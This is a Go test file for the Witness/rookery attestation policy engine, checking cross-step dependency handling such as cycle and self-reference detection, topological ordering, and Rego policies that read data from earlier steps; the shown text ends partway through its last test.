//go:build audit

// Copyright 2024 The Witness Contributors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package policy

import (
	"context"
	"crypto"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"sort"
	"testing"
	"time"

	"github.com/aflock-ai/rookery/attestation"
	"github.com/aflock-ai/rookery/attestation/cryptoutil"
	"github.com/aflock-ai/rookery/attestation/intoto"
	"github.com/aflock-ai/rookery/attestation/source"
	"github.com/invopop/jsonschema"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

// ---------------------------------------------------------------------------
// helpers local to cross-step tests
// ---------------------------------------------------------------------------

// makeVerifierAndKeyID generates a fresh ECDSA key pair and returns the
// verifier and its key ID. This is used extensively to build functionaries
// for integration tests.
func makeVerifierAndKeyID(t *testing.T) (cryptoutil.Verifier, string) {
	t.Helper()
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	require.NoError(t, err)
	verifier := cryptoutil.NewECDSAVerifier(&priv.PublicKey, crypto.SHA256)
	keyID, err := verifier.KeyID()
	require.NoError(t, err)
	return verifier, keyID
}

// makeCVR builds a CollectionVerificationResult for use in tests.
func makeCVR(stepName string, verifier cryptoutil.Verifier, attestations ...attestation.CollectionAttestation) source.CollectionVerificationResult {
	coll := attestation.Collection{
		Name:         stepName,
		Attestations: attestations,
	}
	return source.CollectionVerificationResult{
		Verifiers: []cryptoutil.Verifier{verifier},
		CollectionEnvelope: source.CollectionEnvelope{
			Collection: coll,
			Statement:  intoto.Statement{PredicateType: attestation.CollectionType},
		},
	}
}

// futurePolicy returns a Policy with Expires one hour from now and the given steps.
func futurePolicy(steps map[string]Step) Policy {
	return Policy{
		Expires: metav1.Time{Time: time.Now().Add(1 * time.Hour)},
		Steps:   steps,
	}
}

// verifyOpts returns a standard set of VerifyOptions using the given source.
func verifyOpts(src source.VerifiedSourcer) []VerifyOption {
	return []VerifyOption{
		WithVerifiedSource(src),
		WithSubjectDigests([]string{"sha256:abc"}),
	}
}

// ---------------------------------------------------------------------------
// 1. Circular dependencies
// ---------------------------------------------------------------------------

func TestCrossStep_Validate_CircularDependencies(t *testing.T) {
	tests := []struct {
		name        string
		steps       map[string]Step
		wantCycle   bool
		minCycleLen int // minimum expected Steps in ErrCircularDependency
	}{
		{
			name: "direct_mutual_A_B",
			steps: map[string]Step{
				"a": {Name: "a", AttestationsFrom: []string{"b"}},
				"b": {Name: "b", AttestationsFrom: []string{"a"}},
			},
			wantCycle:   true,
			minCycleLen: 2,
		},
		{
			name: "triangle_A_B_C",
			steps: map[string]Step{
				"a": {Name: "a", AttestationsFrom: []string{"c"}},
				"b": {Name: "b", AttestationsFrom: []string{"a"}},
				"c": {Name: "c", AttestationsFrom: []string{"b"}},
			},
			wantCycle:   true,
			minCycleLen: 3,
		},
		{
			name: "cycle_in_subgraph_with_innocent_bystander",
			steps: map[string]Step{
				"root":    {Name: "root"},
				"cycleA":  {Name: "cycleA", AttestationsFrom: []string{"root", "cycleB"}},
				"cycleB":  {Name: "cycleB", AttestationsFrom: []string{"cycleA"}},
				"deploy":  {Name: "deploy", AttestationsFrom: []string{"root"}},
			},
			wantCycle:   true,
			minCycleLen: 2,
		},
		{
			name: "four_step_cycle",
			steps: map[string]Step{
				"a": {Name: "a", AttestationsFrom: []string{"d"}},
				"b": {Name: "b", AttestationsFrom: []string{"a"}},
				"c": {Name: "c", AttestationsFrom: []string{"b"}},
				"d": {Name: "d", AttestationsFrom: []string{"c"}},
			},
			wantCycle:   true,
			minCycleLen: 4,
		},
		{
			name: "no_cycle_long_chain",
			steps: map[string]Step{
				"a": {Name: "a"},
				"b": {Name: "b", AttestationsFrom: []string{"a"}},
				"c": {Name: "c", AttestationsFrom: []string{"b"}},
				"d": {Name: "d", AttestationsFrom: []string{"c"}},
			},
			wantCycle: false,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			p := Policy{Steps: tc.steps}
			err := p.Validate()
			if tc.wantCycle {
				require.Error(t, err, "expected circular dependency error")
				var cycleErr ErrCircularDependency
				require.ErrorAs(t, err, &cycleErr, "error must be ErrCircularDependency")
				assert.GreaterOrEqual(t, len(cycleErr.Steps), tc.minCycleLen,
					"cycle path should contain at least %d steps, got %v", tc.minCycleLen, cycleErr.Steps)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

// TestCrossStep_Verify_CircularDependency_BlocksVerification ensures that
// Policy.Verify itself catches cycles and refuses to proceed.
func TestCrossStep_Verify_CircularDependency_BlocksVerification(t *testing.T) {
	p := futurePolicy(map[string]Step{
		"a": {Name: "a", AttestationsFrom: []string{"b"}},
		"b": {Name: "b", AttestationsFrom: []string{"c"}},
		"c": {Name: "c", AttestationsFrom: []string{"a"}},
	})
	ms := &mockVerifiedSource{}
	pass, _, err := p.Verify(context.Background(), verifyOpts(ms)...)
	assert.False(t, pass)
	require.Error(t, err)
	// Either Validate or topologicalSort should catch this.
	var cycleErr ErrCircularDependency
	assert.ErrorAs(t, err, &cycleErr)
}

// ---------------------------------------------------------------------------
// 2. Missing step references
// ---------------------------------------------------------------------------

func TestCrossStep_Validate_MissingStepReferences(t *testing.T) {
	tests := []struct {
		name         string
		steps        map[string]Step
		wantErr      bool
		wantContains string
	}{
		{
			name: "single_missing_reference",
			steps: map[string]Step{
				"build": {Name: "build", AttestationsFrom: []string{"nonexistent"}},
			},
			wantErr:      true,
			wantContains: "nonexistent",
		},
		{
			name: "one_valid_one_missing",
			steps: map[string]Step{
				"build":  {Name: "build"},
				"deploy": {Name: "deploy", AttestationsFrom: []string{"build", "phantom"}},
			},
			wantErr:      true,
			wantContains: "phantom",
		},
		{
			name: "multiple_missing_references",
			steps: map[string]Step{
				"deploy": {Name: "deploy", AttestationsFrom: []string{"ghost1", "ghost2"}},
			},
			wantErr: true,
			// At least one of them should appear in the error
		},
		{
			name: "reference_to_empty_string_step_name",
			steps: map[string]Step{
				"build": {Name: "build", AttestationsFrom: []string{""}},
			},
			wantErr: true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			p := Policy{Steps: tc.steps}
			err := p.Validate()
			if tc.wantErr {
				require.Error(t, err)
				if tc.wantContains != "" {
					assert.Contains(t, err.Error(), tc.wantContains)
				}
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

// TestCrossStep_Verify_MissingStepReference_FailsVerify ensures Verify catches
// unknown steps before reaching any evaluation logic.
func TestCrossStep_Verify_MissingStepReference_FailsVerify(t *testing.T) {
	p := futurePolicy(map[string]Step{
		"build":  {Name: "build"},
		"deploy": {Name: "deploy", AttestationsFrom: []string{"build", "does_not_exist"}},
	})
	ms := &mockVerifiedSource{}
	pass, _, err := p.Verify(context.Background(), verifyOpts(ms)...)
	assert.False(t, pass)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "does_not_exist")
}

// ---------------------------------------------------------------------------
// 3. Deep dependency chains
// ---------------------------------------------------------------------------

func TestCrossStep_TopologicalSort_DeepChain(t *testing.T) {
	// A -> B -> C -> D -> E (E has no deps)
	p := Policy{
		Steps: map[string]Step{
			"a": {Name: "a", AttestationsFrom: []string{"b"}},
			"b": {Name: "b", AttestationsFrom: []string{"c"}},
			"c": {Name: "c", AttestationsFrom: []string{"d"}},
			"d": {Name: "d", AttestationsFrom: []string{"e"}},
			"e": {Name: "e"},
		},
	}

	require.NoError(t, p.Validate())

	sorted, err := p.topologicalSort()
	require.NoError(t, err)
	require.Len(t, sorted, 5)

	indexOf := func(name string) int {
		for i, s := range sorted {
			if s == name {
				return i
			}
		}
		t.Fatalf("step %q not found in sorted output", name)
		return -1
	}

	// e must come before d, d before c, c before b, b before a
	assert.Less(t, indexOf("e"), indexOf("d"))
	assert.Less(t, indexOf("d"), indexOf("c"))
	assert.Less(t, indexOf("c"), indexOf("b"))
	assert.Less(t, indexOf("b"), indexOf("a"))
}

// TestCrossStep_DeepChain_ContextPropagation verifies that in a deep chain
// A->B->C, the context built for A includes data from B, and data from B
// was built using C's data. This is an adversarial test that ensures the
// topological ordering actually affects context building.
func TestCrossStep_DeepChain_ContextPropagation(t *testing.T) {
	verifier, keyID := makeVerifierAndKeyID(t)

	attTypeC := "https://example.com/c-att/v1"
	attTypeB := "https://example.com/b-att/v1"

	// Step C: has an attestation
	// Step B: depends on C, has an attestation
	// Step A: depends on B, uses a rego policy that requires input.steps.b

	regoModule := []byte(`
package test

deny[msg] {
	not input.steps.b
	msg := "b step data missing"
}
`)

	steps := map[string]Step{
		"c": {
			Name:          "c",
			Functionaries: []Functionary{{PublicKeyID: keyID}},
			Attestations:  []Attestation{{Type: attTypeC}},
		},
		"b": {
			Name:             "b",
			AttestationsFrom: []string{"c"},
			Functionaries:    []Functionary{{PublicKeyID: keyID}},
			Attestations:     []Attestation{{Type: attTypeB}},
		},
		"a": {
			Name:             "a",
			AttestationsFrom: []string{"b"},
			Functionaries:    []Functionary{{PublicKeyID: keyID}},
			Attestations: []Attestation{{
				Type:         "https://example.com/a-att/v1",
				RegoPolicies: []RegoPolicy{{Module: regoModule, Name: "check-b.rego"}},
			}},
		},
	}

	aAttType := "https://example.com/a-att/v1"

	src := &stepAwareVerifiedSource{
		byStep: map[string][]source.CollectionVerificationResult{
			"c": {makeCVR("c", verifier, attestation.CollectionAttestation{
				Type:        attTypeC,
				Attestation: &marshalableAttestor{AttName: "c-att", AttType: attTypeC},
			})},
			"b": {makeCVR("b", verifier, attestation.CollectionAttestation{
				Type:        attTypeB,
				Attestation: &marshalableAttestor{AttName: "b-att", AttType: attTypeB},
			})},
			"a": {makeCVR("a", verifier, attestation.CollectionAttestation{
				Type:        aAttType,
				Attestation: &marshalableAttestor{AttName: "a-att", AttType: aAttType},
			})},
		},
	}

	p := futurePolicy(steps)
	pass, results, err := p.Verify(context.Background(), verifyOpts(src)...)
	require.NoError(t, err)
	assert.True(t, pass, "deep chain should pass when all deps are satisfied")
	assert.True(t, results["a"].HasPassed())
	assert.True(t, results["b"].HasPassed())
	assert.True(t, results["c"].HasPassed())
}

// ---------------------------------------------------------------------------
// 4. Diamond dependencies
// ---------------------------------------------------------------------------

func TestCrossStep_TopologicalSort_Diamond(t *testing.T) {
	//     A
	//    / \
	//   B   C
	//    \ /
	//     D
	// D depends on B and C. B and C depend on A.
	p := Policy{
		Steps: map[string]Step{
			"a": {Name: "a"},
			"b": {Name: "b", AttestationsFrom: []string{"a"}},
			"c": {Name: "c", AttestationsFrom: []string{"a"}},
			"d": {Name: "d", AttestationsFrom: []string{"b", "c"}},
		},
	}

	require.NoError(t, p.Validate(), "diamond DAG should be valid")

	sorted, err := p.topologicalSort()
	require.NoError(t, err)
	require.Len(t, sorted, 4)

	indexOf := func(name string) int {
		for i, s := range sorted {
			if s == name {
				return i
			}
		}
		t.Fatalf("step %q not found in sorted output", name)
		return -1
	}

	// A must come before B and C
	assert.Less(t, indexOf("a"), indexOf("b"))
	assert.Less(t, indexOf("a"), indexOf("c"))
	// B and C must come before D
	assert.Less(t, indexOf("b"), indexOf("d"))
	assert.Less(t, indexOf("c"), indexOf("d"))
}

func TestCrossStep_Diamond_ContextContainsBothBranches(t *testing.T) {
	// Step D depends on B and C. Its rego policy checks that BOTH branches
	// are present in input.steps.
	verifier, keyID := makeVerifierAndKeyID(t)

	attTypeA := "https://example.com/a-att/v1"
	attTypeB := "https://example.com/b-att/v1"
	attTypeC := "https://example.com/c-att/v1"
	attTypeD := "https://example.com/d-att/v1"

	regoModule := []byte(`
package diamond

deny[msg] {
	not input.steps.b
	msg := "branch b missing"
}

deny[msg] {
	not input.steps.c
	msg := "branch c missing"
}
`)

	steps := map[string]Step{
		"a": {
			Name:          "a",
			Functionaries: []Functionary{{PublicKeyID: keyID}},
			Attestations:  []Attestation{{Type: attTypeA}},
		},
		"b": {
			Name:             "b",
			AttestationsFrom: []string{"a"},
			Functionaries:    []Functionary{{PublicKeyID: keyID}},
			Attestations:     []Attestation{{Type: attTypeB}},
		},
		"c": {
			Name:             "c",
			AttestationsFrom: []string{"a"},
			Functionaries:    []Functionary{{PublicKeyID: keyID}},
			Attestations:     []Attestation{{Type: attTypeC}},
		},
		"d": {
			Name:             "d",
			AttestationsFrom: []string{"b", "c"},
			Functionaries:    []Functionary{{PublicKeyID: keyID}},
			Attestations: []Attestation{{
				Type:         attTypeD,
				RegoPolicies: []RegoPolicy{{Module: regoModule, Name: "diamond.rego"}},
			}},
		},
	}

	src := &stepAwareVerifiedSource{
		byStep: map[string][]source.CollectionVerificationResult{
			"a": {makeCVR("a", verifier, attestation.CollectionAttestation{
				Type: attTypeA, Attestation: &marshalableAttestor{AttName: "a", AttType: attTypeA},
			})},
			"b": {makeCVR("b", verifier, attestation.CollectionAttestation{
				Type: attTypeB, Attestation: &marshalableAttestor{AttName: "b", AttType: attTypeB},
			})},
			"c": {makeCVR("c", verifier, attestation.CollectionAttestation{
				Type: attTypeC, Attestation: &marshalableAttestor{AttName: "c", AttType: attTypeC},
			})},
			"d": {makeCVR("d", verifier, attestation.CollectionAttestation{
				Type: attTypeD, Attestation: &marshalableAttestor{AttName: "d", AttType: attTypeD},
			})},
		},
	}

	p := futurePolicy(steps)
	pass, results, err := p.Verify(context.Background(), verifyOpts(src)...)
	require.NoError(t, err)
	assert.True(t, pass, "diamond DAG should pass")
	for _, name := range []string{"a", "b", "c", "d"} {
		assert.True(t, results[name].HasPassed(), "step %s should have passed", name)
	}
}

// ---------------------------------------------------------------------------
// 5. Step referencing itself
// ---------------------------------------------------------------------------

func TestCrossStep_SelfReference(t *testing.T) {
	tests := []struct {
		name  string
		steps map[string]Step
	}{
		{
			name: "simple_self_ref",
			steps: map[string]Step{
				"build": {Name: "build", AttestationsFrom: []string{"build"}},
			},
		},
		{
			name: "self_ref_among_valid_refs",
			steps: map[string]Step{
				"a":     {Name: "a"},
				"build": {Name: "build", AttestationsFrom: []string{"a", "build"}},
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			p := Policy{Steps: tc.steps}
			err := p.Validate()
			require.Error(t, err)
			var selfRef ErrSelfReference
			require.ErrorAs(t, err, &selfRef)
			assert.Equal(t, "build", selfRef.Step)
		})
	}
}

// TestCrossStep_SelfReference_Verify ensures that Verify also catches
// self-references and fails before any evaluation happens.
func TestCrossStep_SelfReference_Verify(t *testing.T) {
	p := futurePolicy(map[string]Step{
		"build": {Name: "build", AttestationsFrom: []string{"build"}},
	})
	ms := &mockVerifiedSource{}
	pass, _, err := p.Verify(context.Background(), verifyOpts(ms)...)
	assert.False(t, pass)
	require.Error(t, err)
	var selfRef ErrSelfReference
	assert.ErrorAs(t, err, &selfRef)
}

// ---------------------------------------------------------------------------
// 6. Empty AttestationsFrom list
// ---------------------------------------------------------------------------

func TestCrossStep_EmptyAttestationsFrom(t *testing.T) {
	tests := []struct {
		name string
		step Step
	}{
		{
			name: "nil_attestationsFrom",
			step: Step{Name: "build", AttestationsFrom: nil},
		},
		{
			name: "empty_slice_attestationsFrom",
			step: Step{Name: "build", AttestationsFrom: []string{}},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			p := Policy{Steps: map[string]Step{tc.step.Name: tc.step}}
			assert.NoError(t, p.Validate())

			sorted, err := p.topologicalSort()
			require.NoError(t, err)
			assert.Len(t, sorted, 1)

			// buildStepContext should return nil for empty deps.
			ctx := buildStepContext(tc.step.AttestationsFrom, map[string]StepResult{})
			assert.Nil(t, ctx)

			// checkDependencies should pass for empty deps.
			assert.NoError(t, checkDependencies(tc.step.AttestationsFrom, nil))
		})
	}
}

// ---------------------------------------------------------------------------
// 7. Duplicate entries in AttestationsFrom
// ---------------------------------------------------------------------------

func TestCrossStep_DuplicateAttestationsFrom(t *testing.T) {
	t.Run("validate_allows_duplicates", func(t *testing.T) {
		// Validate does not explicitly reject duplicates. This test
		// documents the current behavior. If you consider duplicates a
		// bug, make this test assert Error instead.
		p := Policy{
			Steps: map[string]Step{
				"build":  {Name: "build"},
				"deploy": {Name: "deploy", AttestationsFrom: []string{"build", "build"}},
			},
		}
		err := p.Validate()
		// Currently this does NOT error -- it's arguably a bug but let's
		// document the behavior.
		assert.NoError(t, err, "duplicates in AttestationsFrom are not currently rejected by Validate")
	})

	t.Run("topological_sort_handles_duplicates", func(t *testing.T) {
		p := Policy{
			Steps: map[string]Step{
				"build":  {Name: "build"},
				"deploy": {Name: "deploy", AttestationsFrom: []string{"build", "build", "build"}},
			},
		}
		sorted, err := p.topologicalSort()
		require.NoError(t, err)
		assert.Len(t, sorted, 2, "duplicate deps should not cause extra entries")
	})

	t.Run("buildStepContext_duplicates_do_not_double_data", func(t *testing.T) {
		attType := "https://example.com/att/v1"
		results := map[string]StepResult{
			"build": {
				Step: "build",
				Passed: []PassedCollection{{
					Collection: source.CollectionVerificationResult{
						CollectionEnvelope: source.CollectionEnvelope{
							Collection: attestation.Collection{
								Name: "build",
								Attestations: []attestation.CollectionAttestation{{
									Type:        attType,
									Attestation: &marshalableAttestor{AttName: "build-att", AttType: attType},
								}},
							},
						},
					},
				}},
			},
		}

		ctx := buildStepContext([]string{"build", "build"}, results)
		require.NotNil(t, ctx)
		// Should only have one "build" key, not two
		assert.Len(t, ctx, 1, "duplicate refs should result in single context entry")
	})

	t.Run("checkDependencies_duplicates_all_satisfied", func(t *testing.T) {
		results := map[string]StepResult{
			"build": {Step: "build", Passed: []PassedCollection{{}}},
		}
		err := checkDependencies([]string{"build", "build"}, results)
		assert.NoError(t, err, "duplicates should pass if the step is satisfied")
	})
}

// ---------------------------------------------------------------------------
// 8. Cross-step attestation data passed to Rego correctly
// ---------------------------------------------------------------------------

func TestCrossStep_RegoReceivesCorrectData(t *testing.T) {
	t.Run("rego_can_read_specific_attestation_field", func(t *testing.T) {
		// Build step produces an attestation with a specific field value.
		// Deploy step uses a rego policy that reads that specific field
		// from input.steps.build.
		regoModule := []byte(`
package crosscheck

deny[msg] {
	build_data := input.steps.build["https://example.com/build-att/v1"]
	build_data.name != "correct-build"
	msg := sprintf("expected build name 'correct-build', got '%s'", [build_data.name])
}
`)
		attType := "https://example.com/build-att/v1"
		stepCtx := map[string]interface{}{
			"build": map[string]interface{}{
				attType: map[string]interface{}{
					"name": "correct-build",
					"type": attType,
				},
			},
		}

		err := EvaluateRegoPolicy(
			&marshalableAttestor{AttName: "deploy-att", AttType: "deploy-type"},
			[]RegoPolicy{{Module: regoModule, Name: "crosscheck.rego"}},
			stepCtx,
		)
		assert.NoError(t, err, "rego should pass when cross-step data has correct value")
	})

	t.Run("rego_denies_when_cross_step_field_wrong", func(t *testing.T) {
		regoModule := []byte(`
package crosscheck

deny[msg] {
	build_data := input.steps.build["https://example.com/build-att/v1"]
	build_data.name != "correct-build"
	msg := "build name mismatch"
}
`)
		attType := "https://example.com/build-att/v1"
		stepCtx := map[string]interface{}{
			"build": map[string]interface{}{
				attType: map[string]interface{}{
					"name": "WRONG-NAME",
					"type": attType,
				},
			},
		}

		err := EvaluateRegoPolicy(
			&marshalableAttestor{AttName: "deploy-att", AttType: "deploy-type"},
			[]RegoPolicy{{Module: regoModule, Name: "crosscheck.rego"}},
			stepCtx,
		)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "build name mismatch")
	})

	t.Run("rego_can_access_own_attestation_via_input_attestation", func(t *testing.T) {
		// When step context is provided, the attestor data is at input.attestation
		// (not at the top level). Verify that policies can read it.
		regoModule := []byte(`
package selfcheck

deny[msg] {
	input.attestation.name != "deploy-att"
	msg := "own attestation name mismatch"
}
`)
		stepCtx := map[string]interface{}{
			"build": map[string]interface{}{},
		}

		err := EvaluateRegoPolicy(
			&marshalableAttestor{AttName: "deploy-att", AttType: "deploy-type"},
			[]RegoPolicy{{Module: regoModule, Name: "selfcheck.rego"}},
			stepCtx,
		)
		assert.NoError(t, err)
	})

	t.Run("rego_denies_when_dep_step_entirely_absent", func(t *testing.T) {
		regoModule := []byte(`
package missingdep

deny[msg] {
	not input.steps.build
	msg := "no build step"
}
`)
		// Step context exists but doesn't include "build"
		stepCtx := map[string]interface{}{
			"something_else": map[string]interface{}{},
		}

		err := EvaluateRegoPolicy(
			&marshalableAttestor{AttName: "deploy-att", AttType: "deploy-type"},
			[]RegoPolicy{{Module: regoModule, Name: "missingdep.rego"}},
			stepCtx,
		)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "no build step")
	})

	t.Run("rego_multi_step_context", func(t *testing.T) {
		// Policy that checks data from TWO different steps.
		regoModule := []byte(`
package multi

deny[msg] {
	not input.steps.build
	msg := "missing build"
}

deny[msg] {
	not input.steps.test
	msg := "missing test"
}
`)
		stepCtx := map[string]interface{}{
			"build": map[string]interface{}{
				"att1": map[string]interface{}{"status": "ok"},
			},
			"test": map[string]interface{}{
				"att2": map[string]interface{}{"passed": true},
			},
		}

		err := EvaluateRegoPolicy(
			&marshalableAttestor{AttName: "deploy-att", AttType: "deploy-type"},
			[]RegoPolicy{{Module: regoModule, Name: "multi.rego"}},
			stepCtx,
		)
		assert.NoError(t, err, "rego should pass when both dep steps present")
	})
}

// ---------------------------------------------------------------------------
// 9. Steps with attestations from steps that have no materials/products
// ---------------------------------------------------------------------------

func TestCrossStep_DepStepHasNoAttestations(t *testing.T) {
	t.Run("buildStepContext_dep_has_empty_attestations", func(t *testing.T) {
		// The dependency step passed but its collection has no attestations.
		// buildStepContext should handle this gracefully -- the step won't
		// have any attestation data in the context map.
		results := map[string]StepResult{
			"build": {
				Step: "build",
				Passed: []PassedCollection{{
					Collection: source.CollectionVerificationResult{
						CollectionEnvelope: source.CollectionEnvelope{
							Collection: attestation.Collection{
								Name:         "build",
								Attestations: nil, // no attestations
							},
						},
					},
				}},
			},
		}

		ctx := buildStepContext([]string{"build"}, results)
		// When the dep has no attestations, stepData is empty, so the
		// step is NOT added to the context map. This means ctx is nil.
		assert.Nil(t, ctx, "dep with no attestations should produce nil context")
	})

	t.Run("dep_with_empty_attestations_still_passes_checkDependencies", func(t *testing.T) {
		// checkDependencies only checks Passed is non-empty, not whether
		// attestations exist in the collection.
		results := map[string]StepResult{
			"build": {
				Step: "build",
				Passed: []PassedCollection{{
					Collection: source.CollectionVerificationResult{
						CollectionEnvelope: source.CollectionEnvelope{
							Collection: attestation.Collection{Name: "build"},
						},
					},
				}},
			},
		}

		err := checkDependencies([]string{"build"}, results)
		assert.NoError(t, err, "checkDependencies only cares about Passed, not attestation content")
	})

	t.Run("rego_handles_nil_step_context_from_empty_dep", func(t *testing.T) {
		// If the dep step has no attestation data, buildStepContext returns
		// nil for that step. Rego policies referencing that step should fail
		// with a deny, not a panic.
		regoModule := []byte(`
package emptycheck

deny[msg] {
	not input.steps.build
	msg := "build data missing"
}
`)
		// nil stepContext triggers the backward-compat path where input
		// is the attestor directly (no .steps).
		// With an empty map as stepContext, the wrapping happens but
		// build is missing.
		stepCtx := map[string]interface{}{}

		err := EvaluateRegoPolicy(
			&marshalableAttestor{AttName: "deploy", AttType: "deploy-type"},
			[]RegoPolicy{{Module: regoModule, Name: "emptycheck.rego"}},
			stepCtx,
		)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "build data missing")
	})
}

// ---------------------------------------------------------------------------
// 10. Policy with mix of cross-step and standalone steps
// ---------------------------------------------------------------------------

func TestCrossStep_MixedPolicy(t *testing.T) {
	verifier, keyID := makeVerifierAndKeyID(t)

	buildAttType := "https://example.com/build/v1"
	lintAttType := "https://example.com/lint/v1"
	deployAttType := "https://example.com/deploy/v1"

	steps := map[string]Step{
		"build": {
			Name:          "build",
			Functionaries: []Functionary{{PublicKeyID: keyID}},
			Attestations:  []Attestation{{Type: buildAttType}},
			// standalone -- no AttestationsFrom
		},
		"lint": {
			Name:          "lint",
			Functionaries: []Functionary{{PublicKeyID: keyID}},
			Attestations:  []Attestation{{Type: lintAttType}},
			// standalone -- no AttestationsFrom
		},
		"deploy": {
			Name:             "deploy",
			AttestationsFrom: []string{"build"},
			Functionaries:    []Functionary{{PublicKeyID: keyID}},
			Attestations:     []Attestation{{Type: deployAttType}},
		},
	}

	src := &stepAwareVerifiedSource{
		byStep: map[string][]source.CollectionVerificationResult{
			"build": {makeCVR("build", verifier, attestation.CollectionAttestation{
				Type: buildAttType, Attestation: &marshalableAttestor{AttName: "build", AttType: buildAttType},
			})},
			"lint": {makeCVR("lint", verifier, attestation.CollectionAttestation{
				Type: lintAttType, Attestation: &marshalableAttestor{AttName: "lint", AttType: lintAttType},
			})},
			"deploy": {makeCVR("deploy", verifier, attestation.CollectionAttestation{
				Type: deployAttType, Attestation: &marshalableAttestor{AttName: "deploy", AttType: deployAttType},
			})},
		},
	}

	p := futurePolicy(steps)
	pass, results, err := p.Verify(context.Background(), verifyOpts(src)...)
	require.NoError(t, err)
	assert.True(t, pass)
	for _, name := range []string{"build", "lint", "deploy"} {
		assert.True(t, results[name].HasPassed(), "step %s should pass", name)
	}
}

// TestCrossStep_MixedPolicy_StandaloneFailDoesNotAffectCrossStep verifies
// that a standalone step failing does NOT affect cross-step evaluation of
// other steps.
func TestCrossStep_MixedPolicy_StandaloneFailDoesNotAffectCrossStep(t *testing.T) {
	verifier, keyID := makeVerifierAndKeyID(t)

	buildAttType := "https://example.com/build/v1"
	deployAttType := "https://example.com/deploy/v1"

	steps := map[string]Step{
		"build": {
			Name:          "build",
			Functionaries: []Functionary{{PublicKeyID: keyID}},
			Attestations:  []Attestation{{Type: buildAttType}},
		},
		"lint": {
			Name:          "lint",
			Functionaries: []Functionary{{PublicKeyID: keyID}},
			// lint expects an attestation type that won't be in its collection
			Attestations: []Attestation{{Type: "https://example.com/missing-type"}},
		},
		"deploy": {
			Name:             "deploy",
			AttestationsFrom: []string{"build"},
			Functionaries:    []Functionary{{PublicKeyID: keyID}},
			Attestations:     []Attestation{{Type: deployAttType}},
		},
	}

	src := &stepAwareVerifiedSource{
		byStep: map[string][]source.CollectionVerificationResult{
			"build": {makeCVR("build", verifier, attestation.CollectionAttestation{
				Type: buildAttType, Attestation: &marshalableAttestor{AttName: "build", AttType: buildAttType},
			})},
			"lint": {makeCVR("lint", verifier)}, // no attestations -> lint will fail
			"deploy": {makeCVR("deploy", verifier, attestation.CollectionAttestation{
				Type: deployAttType, Attestation: &marshalableAttestor{AttName: "deploy", AttType: deployAttType},
			})},
		},
	}

	p := futurePolicy(steps)
	pass, results, err := p.Verify(context.Background(), verifyOpts(src)...)
	require.NoError(t, err)
	assert.False(t, pass, "overall should fail because lint fails")
	// lint should fail
	assert.False(t, results["lint"].Analyze(), "lint should fail")
	// build and deploy should still pass independently
	assert.True(t, results["build"].HasPassed(), "build should pass")
	assert.True(t, results["deploy"].HasPassed(), "deploy should pass")
}

// ---------------------------------------------------------------------------
// Additional adversarial scenarios
// ---------------------------------------------------------------------------

// TestCrossStep_TopologicalSort_CycleDetection confirms that topologicalSort
// returns an error for a cycle (Kahn's algorithm leaves nodes with non-zero
// in-degree).
func TestCrossStep_TopologicalSort_CycleDetection(t *testing.T) {
	p := Policy{
		Steps: map[string]Step{
			"a": {Name: "a", AttestationsFrom: []string{"b"}},
			"b": {Name: "b", AttestationsFrom: []string{"a"}},
		},
	}
	_, err := p.topologicalSort()
	require.Error(t, err, "topologicalSort should detect cycles")
	assert.Contains(t, err.Error(), "cycle")
}

// TestCrossStep_TopologicalSort_Deterministic verifies that independent steps
// (no deps) appear in a consistent order across multiple runs. Maps in Go
// have non-deterministic iteration, so the sort should produce stable output.
// NOTE: This test is about documenting behavior -- Kahn's algorithm over a map
// is inherently non-deterministic for equal-priority nodes. If this test is
// flaky, that itself is a finding.
func TestCrossStep_TopologicalSort_StableForDependentSteps(t *testing.T) {
	// Create a chain where the order IS deterministic (not depending on map order).
	p := Policy{
		Steps: map[string]Step{
			"z": {Name: "z"},
			"y": {Name: "y", AttestationsFrom: []string{"z"}},
			"x": {Name: "x", AttestationsFrom: []string{"y"}},
		},
	}

	sorted, err := p.topologicalSort()
	require.NoError(t, err)
	require.Len(t, sorted, 3)
	// For a strict chain, the order is fully determined.
	assert.Equal(t, "z", sorted[0])
	assert.Equal(t, "y", sorted[1])
	assert.Equal(t, "x", sorted[2])
}

// TestCrossStep_BuildStepContext_MultiplePassed verifies that when a dep step
// has multiple passed collections, attestation data from ALL of them is included.
// This could be a security concern if not handled carefully.
func TestCrossStep_BuildStepContext_MultiplePassed(t *testing.T) {
	attType1 := "https://example.com/att1/v1"
	attType2 := "https://example.com/att2/v1"

	results := map[string]StepResult{
		"build": {
			Step: "build",
			Passed: []PassedCollection{
				{
					Collection: source.CollectionVerificationResult{
						CollectionEnvelope: source.CollectionEnvelope{
							Collection: attestation.Collection{
								Name: "build",
								Attestations: []attestation.CollectionAttestation{{
									Type:        attType1,
									Attestation: &marshalableAttestor{AttName: "att1", AttType: attType1},
								}},
							},
						},
					},
				},
				{
					Collection: source.CollectionVerificationResult{
						CollectionEnvelope: source.CollectionEnvelope{
							Collection: attestation.Collection{
								Name: "build",
								Attestations: []attestation.CollectionAttestation{{
									Type:        attType2,
									Attestation: &marshalableAttestor{AttName: "att2", AttType: attType2},
								}},
							},
						},
					},
				},
			},
		},
	}

	ctx := buildStepContext([]string{"build"}, results)
	require.NotNil(t, ctx)
	buildCtx, ok := ctx["build"]
	require.True(t, ok)
	buildMap := buildCtx.(map[string]interface{})
	// Both attestation types should be present.
